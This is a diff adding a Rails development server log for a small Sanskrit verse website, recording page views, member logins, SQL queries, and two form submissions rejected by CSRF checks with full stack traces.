+  Rendering welcome/home.html.erb within layouts/application
+  Rendered welcome/home.html.erb within layouts/application (Duration: 0.1ms | Allocations: 43)
+[Webpacker] Everything's up-to-date. Nothing to do
+  Rendered layout layouts/application.html.erb (Duration: 4.8ms | Allocations: 3036)
+Completed 200 OK in 6ms (Views: 5.6ms | ActiveRecord: 0.0ms | Allocations: 3474)
+
+
+Started GET "/logging/login" for 14.139.233.131 at 2022-01-05 13:43:25 +0000
+Cannot render console from 14.139.233.131! Allowed networks: 127.0.0.0/127.255.255.255, ::1
+Processing by LoggingController#login as HTML
+  Rendering layout layouts/application.html.erb
+  Rendering logging/login.html.erb within layouts/application
+  Rendered logging/login.html.erb within layouts/application (Duration: 0.8ms | Allocations: 322)
+[Webpacker] Everything's up-to-date. Nothing to do
+  Rendered layout layouts/application.html.erb (Duration: 5.2ms | Allocations: 3302)
+Completed 200 OK in 17ms (Views: 16.9ms | ActiveRecord: 0.0ms | Allocations: 3725)
+
+
+Started POST "/logging/loginp" for 14.139.233.131 at 2022-01-05 13:43:34 +0000
+Cannot render console from 14.139.233.131! Allowed networks: 127.0.0.0/127.255.255.255, ::1
+Processing by LoggingController#loginp as HTML
+  Parameters: {"authenticity_token"=>"[FILTERED]", "email"=>"meda_r@pp.iitr.ac.in", "password"=>"[FILTERED]", "commit"=>"Log In"}
+  [1m[36mMember Load (1.3ms)[0m  [1m[34mSELECT "members".* FROM "members" WHERE "members"."email" = $1 LIMIT $2[0m  [["email", "meda_r@pp.iitr.ac.in"], ["LIMIT", 1]]
+  ↳ app/controllers/logging_controller.rb:5:in `loginp'
+Redirected to http://13.127.46.121/shlok/ashlokr
+Completed 302 Found in 7ms (ActiveRecord: 1.3ms | Allocations: 1021)
+
+
+Started GET "/shlok/ashlokr" for 14.139.233.131 at 2022-01-05 13:43:34 +0000
+Cannot render console from 14.139.233.131! Allowed networks: 127.0.0.0/127.255.255.255, ::1
+Processing by ShlokController#ashlokr as HTML
+  Rendering layout layouts/application.html.erb
+  Rendering shlok/ashlokr.html.erb within layouts/application
+  [1m[36mShlok Load (1.1ms)[0m  [1m[34mSELECT "shloks".* FROM "shloks"[0m
+  ↳ app/views/shlok/ashlokr.html.erb:13
+  Rendered shlok/ashlokr.html.erb within layouts/application (Duration: 3.4ms | Allocations: 974)
+[Webpacker] Everything's up-to-date. Nothing to do
+  Rendered layout layouts/application.html.erb (Duration: 11.0ms | Allocations: 3958)
+Completed 200 OK in 12ms (Views: 10.5ms | ActiveRecord: 1.1ms | Allocations: 4372)
+
+
+Started GET "/shlok/ashlokc" for 103.37.201.183 at 2022-01-05 13:43:40 +0000
+Cannot render console from 103.37.201.183! Allowed networks: 127.0.0.0/127.255.255.255, ::1
+Processing by ShlokController#ashlokc as HTML
+  Rendering layout layouts/application.html.erb
+  Rendering shlok/ashlokc.html.erb within layouts/application
+  Rendered shlok/ashlokc.html.erb within layouts/application (Duration: 0.6ms | Allocations: 427)
+[Webpacker] Everything's up-to-date. Nothing to do
+  Rendered layout layouts/application.html.erb (Duration: 8.2ms | Allocations: 3400)
+Completed 200 OK in 9ms (Views: 8.7ms | ActiveRecord: 0.0ms | Allocations: 3803)
+
+
+Started GET "/resource/firstresource" for 14.139.233.131 at 2022-01-05 13:43:42 +0000
+Cannot render console from 14.139.233.131! Allowed networks: 127.0.0.0/127.255.255.255, ::1
+Processing by ResourceController#firstresource as HTML
+  Rendering layout layouts/application.html.erb
+  Rendering resource/firstresource.html.erb within layouts/application
+  Rendered resource/firstresource.html.erb within layouts/application (Duration: 0.1ms | Allocations: 36)
+[Webpacker] Everything's up-to-date. Nothing to do
+  Rendered layout layouts/application.html.erb (Duration: 6.7ms | Allocations: 3033)
+Completed 200 OK in 8ms (Views: 7.2ms | ActiveRecord: 0.0ms | Allocations: 3458)
+
+
+Started GET "/shlok/rshlok" for 14.139.233.131 at 2022-01-05 13:43:43 +0000
+Cannot render console from 14.139.233.131! Allowed networks: 127.0.0.0/127.255.255.255, ::1
+Processing by ShlokController#rshlok as HTML
+  Rendering layout layouts/application.html.erb
+  Rendering shlok/rshlok.html.erb within layouts/application
+  [1m[36mShlok Load (1.0ms)[0m  [1m[34mSELECT "shloks".* FROM "shloks"[0m
+  ↳ app/views/shlok/rshlok.html.erb:2
+  Rendered shlok/rshlok.html.erb within layouts/application (Duration: 3.3ms | Allocations: 885)
+[Webpacker] Everything's up-to-date. Nothing to do
+  Rendered layout layouts/application.html.erb (Duration: 7.8ms | Allocations: 3882)
+Completed 200 OK in 9ms (Views: 7.3ms | ActiveRecord: 1.0ms | Allocations: 4296)
+
+
+Started GET "/events/revents" for 14.139.233.131 at 2022-01-05 13:43:43 +0000
+Cannot render console from 14.139.233.131! Allowed networks: 127.0.0.0/127.255.255.255, ::1
+Processing by EventsController#revents as HTML
+  Rendering layout layouts/application.html.erb
+  Rendering events/revents.html.erb within layouts/application
+  Rendered events/revents.html.erb within layouts/application (Duration: 0.1ms | Allocations: 36)
+[Webpacker] Everything's up-to-date. Nothing to do
+  Rendered layout layouts/application.html.erb (Duration: 4.5ms | Allocations: 3022)
+Completed 200 OK in 6ms (Views: 5.0ms | ActiveRecord: 0.0ms | Allocations: 3446)
+
+
+Started GET "/" for 14.139.233.131 at 2022-01-05 13:43:43 +0000
+Cannot render console from 14.139.233.131! Allowed networks: 127.0.0.0/127.255.255.255, ::1
+Processing by WelcomeController#home as HTML
+  Rendering layout layouts/application.html.erb
+  Rendering welcome/home.html.erb within layouts/application
+  Rendered welcome/home.html.erb within layouts/application (Duration: 0.3ms | Allocations: 43)
+[Webpacker] Everything's up-to-date. Nothing to do
+  Rendered layout layouts/application.html.erb (Duration: 4.6ms | Allocations: 3046)
+Completed 200 OK in 6ms (Views: 5.0ms | ActiveRecord: 0.0ms | Allocations: 3479)
+
+
+Started GET "/events/revents" for 14.139.233.131 at 2022-01-05 13:43:46 +0000
+Cannot render console from 14.139.233.131! Allowed networks: 127.0.0.0/127.255.255.255, ::1
+Processing by EventsController#revents as HTML
+  Rendering layout layouts/application.html.erb
+  Rendering events/revents.html.erb within layouts/application
+  Rendered events/revents.html.erb within layouts/application (Duration: 0.1ms | Allocations: 36)
+[Webpacker] Everything's up-to-date. Nothing to do
+  Rendered layout layouts/application.html.erb (Duration: 5.1ms | Allocations: 3022)
+Completed 200 OK in 6ms (Views: 5.5ms | ActiveRecord: 0.0ms | Allocations: 3446)
+
+
+Started GET "/" for 14.139.233.131 at 2022-01-05 13:43:47 +0000
+Cannot render console from 14.139.233.131! Allowed networks: 127.0.0.0/127.255.255.255, ::1
+Processing by WelcomeController#home as HTML
+  Rendering layout layouts/application.html.erb
+  Rendering welcome/home.html.erb within layouts/application
+  Rendered welcome/home.html.erb within layouts/application (Duration: 0.1ms | Allocations: 43)
+[Webpacker] Everything's up-to-date. Nothing to do
+  Rendered layout layouts/application.html.erb (Duration: 4.4ms | Allocations: 3040)
+Completed 200 OK in 5ms (Views: 4.9ms | ActiveRecord: 0.0ms | Allocations: 3473)
+
+
+Started GET "/shlok/rshlok" for 14.139.233.131 at 2022-01-05 13:43:48 +0000
+Cannot render console from 14.139.233.131! Allowed networks: 127.0.0.0/127.255.255.255, ::1
+Processing by ShlokController#rshlok as HTML
+  Rendering layout layouts/application.html.erb
+  Rendering shlok/rshlok.html.erb within layouts/application
+  [1m[36mShlok Load (0.9ms)[0m  [1m[34mSELECT "shloks".* FROM "shloks"[0m
+  ↳ app/views/shlok/rshlok.html.erb:2
+  Rendered shlok/rshlok.html.erb within layouts/application (Duration: 2.9ms | Allocations: 883)
+[Webpacker] Everything's up-to-date. Nothing to do
+  Rendered layout layouts/application.html.erb (Duration: 7.2ms | Allocations: 3869)
+Completed 200 OK in 8ms (Views: 7.0ms | ActiveRecord: 0.9ms | Allocations: 4284)
+
+
+Started GET "/resource/firstresource" for 14.139.233.131 at 2022-01-05 13:43:48 +0000
+Cannot render console from 14.139.233.131! Allowed networks: 127.0.0.0/127.255.255.255, ::1
+Processing by ResourceController#firstresource as HTML
+  Rendering layout layouts/application.html.erb
+  Rendering resource/firstresource.html.erb within layouts/application
+  Rendered resource/firstresource.html.erb within layouts/application (Duration: 0.1ms | Allocations: 36)
+[Webpacker] Everything's up-to-date. Nothing to do
+  Rendered layout layouts/application.html.erb (Duration: 4.4ms | Allocations: 3022)
+Completed 200 OK in 5ms (Views: 4.8ms | ActiveRecord: 0.0ms | Allocations: 3446)
+
+
+Started GET "/shlok/rshlok" for 14.139.233.131 at 2022-01-05 13:43:49 +0000
+Cannot render console from 14.139.233.131! Allowed networks: 127.0.0.0/127.255.255.255, ::1
+Processing by ShlokController#rshlok as HTML
+  Rendering layout layouts/application.html.erb
+  Rendering shlok/rshlok.html.erb within layouts/application
+  [1m[36mShlok Load (0.9ms)[0m  [1m[34mSELECT "shloks".* FROM "shloks"[0m
+  ↳ app/views/shlok/rshlok.html.erb:2
+  Rendered shlok/rshlok.html.erb within layouts/application (Duration: 2.9ms | Allocations: 883)
+[Webpacker] Everything's up-to-date. Nothing to do
+  Rendered layout layouts/application.html.erb (Duration: 8.5ms | Allocations: 3880)
+Completed 200 OK in 10ms (Views: 8.1ms | ActiveRecord: 0.9ms | Allocations: 4294)
+
+
+Started GET "/resource/firstresource" for 14.139.233.131 at 2022-01-05 13:43:50 +0000
+Cannot render console from 14.139.233.131! Allowed networks: 127.0.0.0/127.255.255.255, ::1
+Processing by ResourceController#firstresource as HTML
+  Rendering layout layouts/application.html.erb
+  Rendering resource/firstresource.html.erb within layouts/application
+  Rendered resource/firstresource.html.erb within layouts/application (Duration: 0.1ms | Allocations: 36)
+[Webpacker] Everything's up-to-date. Nothing to do
+  Rendered layout layouts/application.html.erb (Duration: 4.7ms | Allocations: 3033)
+Completed 200 OK in 6ms (Views: 5.2ms | ActiveRecord: 0.0ms | Allocations: 3457)
+
+
+Started GET "/" for 154.89.5.79 at 2022-01-05 13:43:50 +0000
+Cannot render console from 154.89.5.79! Allowed networks: 127.0.0.0/127.255.255.255, ::1
+Processing by WelcomeController#home as */*
+  Rendering layout layouts/application.html.erb
+  Rendering welcome/home.html.erb within layouts/application
+  Rendered welcome/home.html.erb within layouts/application (Duration: 0.1ms | Allocations: 43)
+[Webpacker] Everything's up-to-date. Nothing to do
+  Rendered layout layouts/application.html.erb (Duration: 4.5ms | Allocations: 3047)
+Completed 200 OK in 6ms (Views: 5.2ms | ActiveRecord: 0.0ms | Allocations: 3587)
+
+
+Started POST "/shlok/ashlokcp" for 103.37.201.183 at 2022-01-05 13:43:51 +0000
+Cannot render console from 103.37.201.183! Allowed networks: 127.0.0.0/127.255.255.255, ::1
+Processing by ShlokController#ashlokcp as HTML
+  Parameters: {"authenticity_token"=>"[FILTERED]", "title"=>"a", "shlok"=>"b", "translation"=>"c", "commit"=>"अग्रेस्थापनं करोतु"}
+Can't verify CSRF token authenticity.
+Completed 422 Unprocessable Entity in 1ms (ActiveRecord: 0.0ms | Allocations: 587)
+
+
+  
+ActionController::InvalidAuthenticityToken (ActionController::InvalidAuthenticityToken):
+  
+actionpack (6.1.4.4) lib/action_controller/metal/request_forgery_protection.rb:211:in `handle_unverified_request'
+actionpack (6.1.4.4) lib/action_controller/metal/request_forgery_protection.rb:243:in `handle_unverified_request'
+actionpack (6.1.4.4) lib/action_controller/metal/request_forgery_protection.rb:238:in `verify_authenticity_token'
+activesupport (6.1.4.4) lib/active_support/callbacks.rb:427:in `block in make_lambda'
+activesupport (6.1.4.4) lib/active_support/callbacks.rb:198:in `block (2 levels) in halting'
+actionpack (6.1.4.4) lib/abstract_controller/callbacks.rb:34:in `block (2 levels) in <module:Callbacks>'
+activesupport (6.1.4.4) lib/active_support/callbacks.rb:199:in `block in halting'
+activesupport (6.1.4.4) lib/active_support/callbacks.rb:512:in `block in invoke_before'
+activesupport (6.1.4.4) lib/active_support/callbacks.rb:512:in `each'
+activesupport (6.1.4.4) lib/active_support/callbacks.rb:512:in `invoke_before'
+activesupport (6.1.4.4) lib/active_support/callbacks.rb:115:in `block in run_callbacks'
+activesupport (6.1.4.4) lib/active_support/callbacks.rb:137:in `run_callbacks'
+actionpack (6.1.4.4) lib/abstract_controller/callbacks.rb:41:in `process_action'
+actionpack (6.1.4.4) lib/action_controller/metal/rescue.rb:22:in `process_action'
+actionpack (6.1.4.4) lib/action_controller/metal/instrumentation.rb:34:in `block in process_action'
+activesupport (6.1.4.4) lib/active_support/notifications.rb:203:in `block in instrument'
+activesupport (6.1.4.4) lib/active_support/notifications/instrumenter.rb:24:in `instrument'
+activesupport (6.1.4.4) lib/active_support/notifications.rb:203:in `instrument'
+actionpack (6.1.4.4) lib/action_controller/metal/instrumentation.rb:33:in `process_action'
+actionpack (6.1.4.4) lib/action_controller/metal/params_wrapper.rb:249:in `process_action'
+activerecord (6.1.4.4) lib/active_record/railties/controller_runtime.rb:27:in `process_action'
+actionpack (6.1.4.4) lib/abstract_controller/base.rb:165:in `process'
+actionview (6.1.4.4) lib/action_view/rendering.rb:39:in `process'
+actionpack (6.1.4.4) lib/action_controller/metal.rb:190:in `dispatch'
+actionpack (6.1.4.4) lib/action_controller/metal.rb:254:in `dispatch'
+actionpack (6.1.4.4) lib/action_dispatch/routing/route_set.rb:50:in `dispatch'
+actionpack (6.1.4.4) lib/action_dispatch/routing/route_set.rb:33:in `serve'
+actionpack (6.1.4.4) lib/action_dispatch/journey/router.rb:50:in `block in serve'
+actionpack (6.1.4.4) lib/action_dispatch/journey/router.rb:32:in `each'
+actionpack (6.1.4.4) lib/action_dispatch/journey/router.rb:32:in `serve'
+actionpack (6.1.4.4) lib/action_dispatch/routing/route_set.rb:842:in `call'
+rack (2.2.3) lib/rack/tempfile_reaper.rb:15:in `call'
+rack (2.2.3) lib/rack/etag.rb:27:in `call'
+rack (2.2.3) lib/rack/conditional_get.rb:40:in `call'
+rack (2.2.3) lib/rack/head.rb:12:in `call'
+actionpack (6.1.4.4) lib/action_dispatch/http/permissions_policy.rb:22:in `call'
+actionpack (6.1.4.4) lib/action_dispatch/http/content_security_policy.rb:18:in `call'
+rack (2.2.3) lib/rack/session/abstract/id.rb:266:in `context'
+rack (2.2.3) lib/rack/session/abstract/id.rb:260:in `call'
+actionpack (6.1.4.4) lib/action_dispatch/middleware/cookies.rb:689:in `call'
+activerecord (6.1.4.4) lib/active_record/migration.rb:601:in `call'
+actionpack (6.1.4.4) lib/action_dispatch/middleware/callbacks.rb:27:in `block in call'
+activesupport (6.1.4.4) lib/active_support/callbacks.rb:98:in `run_callbacks'
+actionpack (6.1.4.4) lib/action_dispatch/middleware/callbacks.rb:26:in `call'
+actionpack (6.1.4.4) lib/action_dispatch/middleware/executor.rb:14:in `call'
+actionpack (6.1.4.4) lib/action_dispatch/middleware/actionable_exceptions.rb:18:in `call'
+actionpack (6.1.4.4) lib/action_dispatch/middleware/debug_exceptions.rb:29:in `call'
+web-console (4.2.0) lib/web_console/middleware.rb:132:in `call_app'
+web-console (4.2.0) lib/web_console/middleware.rb:19:in `block in call'
+web-console (4.2.0) lib/web_console/middleware.rb:17:in `catch'
+web-console (4.2.0) lib/web_console/middleware.rb:17:in `call'
+actionpack (6.1.4.4) lib/action_dispatch/middleware/show_exceptions.rb:33:in `call'
+railties (6.1.4.4) lib/rails/rack/logger.rb:37:in `call_app'
+railties (6.1.4.4) lib/rails/rack/logger.rb:26:in `block in call'
+activesupport (6.1.4.4) lib/active_support/tagged_logging.rb:99:in `block in tagged'
+activesupport (6.1.4.4) lib/active_support/tagged_logging.rb:37:in `tagged'
+activesupport (6.1.4.4) lib/active_support/tagged_logging.rb:99:in `tagged'
+railties (6.1.4.4) lib/rails/rack/logger.rb:26:in `call'
+sprockets-rails (3.4.2) lib/sprockets/rails/quiet_assets.rb:13:in `call'
+actionpack (6.1.4.4) lib/action_dispatch/middleware/remote_ip.rb:81:in `call'
+actionpack (6.1.4.4) lib/action_dispatch/middleware/request_id.rb:26:in `call'
+rack (2.2.3) lib/rack/method_override.rb:24:in `call'
+rack (2.2.3) lib/rack/runtime.rb:22:in `call'
+activesupport (6.1.4.4) lib/active_support/cache/strategy/local_cache_middleware.rb:29:in `call'
+actionpack (6.1.4.4) lib/action_dispatch/middleware/executor.rb:14:in `call'
+actionpack (6.1.4.4) lib/action_dispatch/middleware/static.rb:24:in `call'
+rack (2.2.3) lib/rack/sendfile.rb:110:in `call'
+actionpack (6.1.4.4) lib/action_dispatch/middleware/host_authorization.rb:119:in `call'
+rack-mini-profiler (2.3.3) lib/mini_profiler/profiler.rb:393:in `call'
+webpacker (5.4.3) lib/webpacker/dev_server_proxy.rb:25:in `perform_request'
+rack-proxy (0.7.0) lib/rack/proxy.rb:63:in `call'
+railties (6.1.4.4) lib/rails/engine.rb:539:in `call'
+/usr/lib/ruby/vendor_ruby/phusion_passenger/rack/thread_handler_extension.rb:97:in `process_request'
+/usr/lib/ruby/vendor_ruby/phusion_passenger/request_handler/thread_handler.rb:157:in `accept_and_process_next_request'
+/usr/lib/ruby/vendor_ruby/phusion_passenger/request_handler/thread_handler.rb:110:in `main_loop'
+/usr/lib/ruby/vendor_ruby/phusion_passenger/request_handler.rb:415:in `block (3 levels) in start_threads'
+/usr/lib/ruby/vendor_ruby/phusion_passenger/utils.rb:113:in `block in create_thread_and_abort_on_exception'
+Started GET "/shlok/rshlok" for 14.139.233.131 at 2022-01-05 13:44:26 +0000
+Cannot render console from 14.139.233.131! Allowed networks: 127.0.0.0/127.255.255.255, ::1
+Processing by ShlokController#rshlok as HTML
+  Rendering layout layouts/application.html.erb
+  Rendering shlok/rshlok.html.erb within layouts/application
+  [1m[36mShlok Load (0.9ms)[0m  [1m[34mSELECT "shloks".* FROM "shloks"[0m
+  ↳ app/views/shlok/rshlok.html.erb:2
+  Rendered shlok/rshlok.html.erb within layouts/application (Duration: 3.0ms | Allocations: 885)
+[Webpacker] Everything's up-to-date. Nothing to do
+  Rendered layout layouts/application.html.erb (Duration: 8.3ms | Allocations: 3887)
+Completed 200 OK in 10ms (Views: 7.9ms | ActiveRecord: 0.9ms | Allocations: 4302)
+
+
+Started GET "/" for 14.139.233.131 at 2022-01-05 13:44:28 +0000
+Cannot render console from 14.139.233.131! Allowed networks: 127.0.0.0/127.255.255.255, ::1
+Processing by WelcomeController#home as HTML
+  Rendering layout layouts/application.html.erb
+  Rendering welcome/home.html.erb within layouts/application
+  Rendered welcome/home.html.erb within layouts/application (Duration: 0.1ms | Allocations: 43)
+[Webpacker] Everything's up-to-date. Nothing to do
+  Rendered layout layouts/application.html.erb (Duration: 10.3ms | Allocations: 3045)
+Completed 200 OK in 12ms (Views: 10.8ms | ActiveRecord: 0.0ms | Allocations: 3479)
+
+
+Started GET "/events/revents" for 14.139.233.131 at 2022-01-05 13:44:29 +0000
+Cannot render console from 14.139.233.131! Allowed networks: 127.0.0.0/127.255.255.255, ::1
+Processing by EventsController#revents as HTML
+  Rendering layout layouts/application.html.erb
+  Rendering events/revents.html.erb within layouts/application
+  Rendered events/revents.html.erb within layouts/application (Duration: 0.1ms | Allocations: 36)
+[Webpacker] Everything's up-to-date. Nothing to do
+  Rendered layout layouts/application.html.erb (Duration: 4.6ms | Allocations: 3033)
+Completed 200 OK in 6ms (Views: 5.1ms | ActiveRecord: 0.0ms | Allocations: 3457)
+
+
+Started GET "/shlok/rshlok" for 14.139.233.131 at 2022-01-05 13:44:29 +0000
+Cannot render console from 14.139.233.131! Allowed networks: 127.0.0.0/127.255.255.255, ::1
+Processing by ShlokController#rshlok as HTML
+  Rendering layout layouts/application.html.erb
+  Rendering shlok/rshlok.html.erb within layouts/application
+  [1m[36mShlok Load (1.3ms)[0m  [1m[34mSELECT "shloks".* FROM "shloks"[0m
+  ↳ app/views/shlok/rshlok.html.erb:2
+  Rendered shlok/rshlok.html.erb within layouts/application (Duration: 3.6ms | Allocations: 885)
+[Webpacker] Everything's up-to-date. Nothing to do
+  Rendered layout layouts/application.html.erb (Duration: 8.6ms | Allocations: 3871)
+Completed 200 OK in 10ms (Views: 7.9ms | ActiveRecord: 1.3ms | Allocations: 4285)
+
+
+Started GET "/resource/firstresource" for 14.139.233.131 at 2022-01-05 13:44:29 +0000
+Cannot render console from 14.139.233.131! Allowed networks: 127.0.0.0/127.255.255.255, ::1
+Processing by ResourceController#firstresource as HTML
+  Rendering layout layouts/application.html.erb
+  Rendering resource/firstresource.html.erb within layouts/application
+  Rendered resource/firstresource.html.erb within layouts/application (Duration: 0.1ms | Allocations: 36)
+[Webpacker] Everything's up-to-date. Nothing to do
+  Rendered layout layouts/application.html.erb (Duration: 5.1ms | Allocations: 3022)
+Completed 200 OK in 6ms (Views: 5.6ms | ActiveRecord: 0.0ms | Allocations: 3446)
+
+
+Started GET "/logging/logout" for 14.139.233.131 at 2022-01-05 13:44:58 +0000
+Cannot render console from 14.139.233.131! Allowed networks: 127.0.0.0/127.255.255.255, ::1
+Processing by LoggingController#logout as HTML
+Redirected to http://13.127.46.121/
+Completed 302 Found in 1ms (ActiveRecord: 0.0ms | Allocations: 269)
+
+
+Started GET "/" for 14.139.233.131 at 2022-01-05 13:44:58 +0000
+Cannot render console from 14.139.233.131! Allowed networks: 127.0.0.0/127.255.255.255, ::1
+Processing by WelcomeController#home as HTML
+  Rendering layout layouts/application.html.erb
+  Rendering welcome/home.html.erb within layouts/application
+  Rendered welcome/home.html.erb within layouts/application (Duration: 0.1ms | Allocations: 43)
+[Webpacker] Everything's up-to-date. Nothing to do
+  Rendered layout layouts/application.html.erb (Duration: 6.1ms | Allocations: 3036)
+Completed 200 OK in 8ms (Views: 6.7ms | ActiveRecord: 0.0ms | Allocations: 3474)
+
+
+Started GET "/logging/login" for 14.139.233.131 at 2022-01-05 13:44:59 +0000
+Cannot render console from 14.139.233.131! Allowed networks: 127.0.0.0/127.255.255.255, ::1
+Processing by LoggingController#login as HTML
+  Rendering layout layouts/application.html.erb
+  Rendering logging/login.html.erb within layouts/application
+  Rendered logging/login.html.erb within layouts/application (Duration: 0.6ms | Allocations: 300)
+[Webpacker] Everything's up-to-date. Nothing to do
+  Rendered layout layouts/application.html.erb (Duration: 7.0ms | Allocations: 3280)
+Completed 200 OK in 10ms (Views: 9.2ms | ActiveRecord: 0.0ms | Allocations: 3703)
+
+
+Started POST "/logging/loginp" for 14.139.233.131 at 2022-01-05 13:45:06 +0000
+Cannot render console from 14.139.233.131! Allowed networks: 127.0.0.0/127.255.255.255, ::1
+Processing by LoggingController#loginp as HTML
+  Parameters: {"authenticity_token"=>"[FILTERED]", "email"=>"meda_r@pp.iitr.ac.in", "password"=>"[FILTERED]", "commit"=>"Log In"}
+  [1m[36mMember Load (0.7ms)[0m  [1m[34mSELECT "members".* FROM "members" WHERE "members"."email" = $1 LIMIT $2[0m  [["email", "meda_r@pp.iitr.ac.in"], ["LIMIT", 1]]
+  ↳ app/controllers/logging_controller.rb:5:in `loginp'
+Redirected to http://13.127.46.121/shlok/ashlokr
+Completed 302 Found in 3ms (ActiveRecord: 0.7ms | Allocations: 967)
+
+
+Started GET "/shlok/ashlokr" for 14.139.233.131 at 2022-01-05 13:45:06 +0000
+Cannot render console from 14.139.233.131! Allowed networks: 127.0.0.0/127.255.255.255, ::1
+Processing by ShlokController#ashlokr as HTML
+  Rendering layout layouts/application.html.erb
+  Rendering shlok/ashlokr.html.erb within layouts/application
+  [1m[36mShlok Load (1.3ms)[0m  [1m[34mSELECT "shloks".* FROM "shloks"[0m
+  ↳ app/views/shlok/ashlokr.html.erb:13
+  Rendered shlok/ashlokr.html.erb within layouts/application (Duration: 3.5ms | Allocations: 973)
+[Webpacker] Everything's up-to-date. Nothing to do
+  Rendered layout layouts/application.html.erb (Duration: 7.8ms | Allocations: 3965)
+Completed 200 OK in 9ms (Views: 7.0ms | ActiveRecord: 1.3ms | Allocations: 4378)
+
+
+Started GET "/shlok/3" for 14.139.233.131 at 2022-01-05 13:45:09 +0000
+Cannot render console from 14.139.233.131! Allowed networks: 127.0.0.0/127.255.255.255, ::1
+Processing by ShlokController#ashloku as HTML
+  Parameters: {"id"=>"3"}
+  [1m[36mShlok Load (0.7ms)[0m  [1m[34mSELECT "shloks".* FROM "shloks" WHERE "shloks"."sid" = $1 LIMIT $2[0m  [["sid", 3], ["LIMIT", 1]]
+  ↳ app/controllers/shlok_controller.rb:34:in `ashloku'
+  Rendering layout layouts/application.html.erb
+  Rendering shlok/ashloku.html.erb within layouts/application
+  Rendered shlok/ashloku.html.erb within layouts/application (Duration: 0.8ms | Allocations: 441)
+[Webpacker] Everything's up-to-date. Nothing to do
+  Rendered layout layouts/application.html.erb (Duration: 8.7ms | Allocations: 3422)
+Completed 200 OK in 12ms (Views: 9.2ms | ActiveRecord: 0.7ms | Allocations: 4509)
+
+
+Started POST "/shlok/3" for 14.139.233.131 at 2022-01-05 13:45:14 +0000
+Cannot render console from 14.139.233.131! Allowed networks: 127.0.0.0/127.255.255.255, ::1
+Processing by ShlokController#ashlokup as HTML
+  Parameters: {"authenticity_token"=>"[FILTERED]", "title"=>"VERSE FROM A SOUND", "shlok"=>"राज्याभिषेके मदविह्वलायाः<br/> हस्ताच्च्युतोS हेमघटस्तरुण्याः |<br/> सोपानमासाद्य करोति शब्दम्<br/> ठं ठं ठठं ठं ठठठं ठठं ठः fa||", "translation"=>"Composed by one of the legendary poets in the history of Sanskrit, this verse is an example of the games of the learned. The revered Kalidasa constructed this beautiful poem out of a meaningless string of sounds, in the competition of Samasya Pooranam (समस्या-पूरणम्), organised by the great King Bhoj.<br/>\r\nSuch competitions were commonly organised by advocates of literature and scholarship, and Raja Bhoj is one of the most reknowned in this respect.<br/>\r\nIn the particular context of this subhashitam, Raja Bhoj gives a seemingly non-sensical line 'tham tham thatham tham thathatham thatham thah' as a challenge for the assembly of intellectuals gathered in his court, and this subhashitam is the clever solution of Kalidasa to it.<br/><br/>\r\n\r\nराज्याभिषेके In the grand coronation ceremony of the king,<br/>\r\nहेम-घटः च्युतः the golden pot fell away<br/>\r\nमदविह्वलायाः तरुण्याः हस्तात् from the hands of an excited young girl (so excited about the coronation ceremony that she was not in her senses),<br/>\r\nसोपानम् आसाद्य करोति शब्दम् and upon reaching the stairs produced the sound -<br/>\r\nठं ठं ठठं ठं ठठठं ठठं ठः \"tham tham thatham tham thathatham thatham thah\"!!<br/><br/>\r\n\r\nKalidasa thus imagines capturing the sound made by the pot at each step. But both Kalidasa and Raja Bhoj show how rhythm and harmony can be found even in the events we would otherwise perceive as noise; for we see, the 'meaningless' string of sounds actually follows the melodiuos meter of indravajrā (इन्द्रवज्रा)!!<br/>\r\nSuch were the pastimes of the scholars!", "commit"=>"अग्रेस्थापनं करोतु", "id"=>"3"}
+Can't verify CSRF token authenticity.
+Completed 422 Unprocessable Entity in 1ms (ActiveRecord: 0.0ms | Allocations: 581)
+
+
+  
+ActionController::InvalidAuthenticityToken (ActionController::InvalidAuthenticityToken):
+  
+actionpack (6.1.4.4) lib/action_controller/metal/request_forgery_protection.rb:211:in `handle_unverified_request'
+actionpack (6.1.4.4) lib/action_controller/metal/request_forgery_protection.rb:243:in `handle_unverified_request'
+actionpack (6.1.4.4) lib/action_controller/metal/request_forgery_protection.rb:238:in `verify_authenticity_token'
+activesupport (6.1.4.4) lib/active_support/callbacks.rb:427:in `block in make_lambda'
+activesupport (6.1.4.4) lib/active_support/callbacks.rb:198:in `block (2 levels) in halting'
+actionpack (6.1.4.4) lib/abstract_controller/callbacks.rb:34:in `block (2 levels) in <module:Callbacks>'
+activesupport (6.1.4.4) lib/active_support/callbacks.rb:199:in `block in halting'
+activesupport (6.1.4.4) lib/active_support/callbacks.rb:512:in `block in invoke_before'
+activesupport (6.1.4.4) lib/active_support/callbacks.rb:512:in `each'
+activesupport (6.1.4.4) lib/active_support/callbacks.rb:512:in `invoke_before'
+activesupport (6.1.4.4) lib/active_support/callbacks.rb:115:in `block in run_callbacks'
+activesupport (6.1.4.4) lib/active_support/callbacks.rb:137:in `run_callbacks'
+actionpack (6.1.4.4) lib/abstract_controller/callbacks.rb:41:in `process_action'
+actionpack (6.1.4.4) lib/action_controller/metal/rescue.rb:22:in `process_action'
+actionpack (6.1.4.4) lib/action_controller/metal/instrumentation.rb:34:in `block in process_action'
+activesupport (6.1.4.4) lib/active_support/notifications.rb:203:in `block in instrument'
+activesupport (6.1.4.4) lib/active_support/notifications/instrumenter.rb:24:in `instrument'
+activesupport (6.1.4.4) lib/active_support/notifications.rb:203:in `instrument'
+actionpack (6.1.4.4) lib/action_controller/metal/instrumentation.rb:33:in `process_action'
+actionpack (6.1.4.4) lib/action_controller/metal/params_wrapper.rb:249:in `process_action'
+activerecord (6.1.4.4) lib/active_record/railties/controller_runtime.rb:27:in `process_action'
+actionpack (6.1.4.4) lib/abstract_controller/base.rb:165:in `process'
+actionview (6.1.4.4) lib/action_view/rendering.rb:39:in `process'
+actionpack (6.1.4.4) lib/action_controller/metal.rb:190:in `dispatch'
+actionpack (6.1.4.4) lib/action_controller/metal.rb:254:in `dispatch'
+actionpack (6.1.4.4) lib/action_dispatch/routing/route_set.rb:50:in `dispatch'
+actionpack (6.1.4.4) lib/action_dispatch/routing/route_set.rb:33:in `serve'
+actionpack (6.1.4.4) lib/action_dispatch/journey/router.rb:50:in `block in serve'
+actionpack (6.1.4.4) lib/action_dispatch/journey/router.rb:32:in `each'
+actionpack (6.1.4.4) lib/action_dispatch/journey/router.rb:32:in `serve'
+actionpack (6.1.4.4) lib/action_dispatch/routing/route_set.rb:842:in `call'
+rack (2.2.3) lib/rack/tempfile_reaper.rb:15:in `call'
+rack (2.2.3) lib/rack/etag.rb:27:in `call'
+rack (2.2.3) lib/rack/conditional_get.rb:40:in `call'
+rack (2.2.3) lib/rack/head.rb:12:in `call'
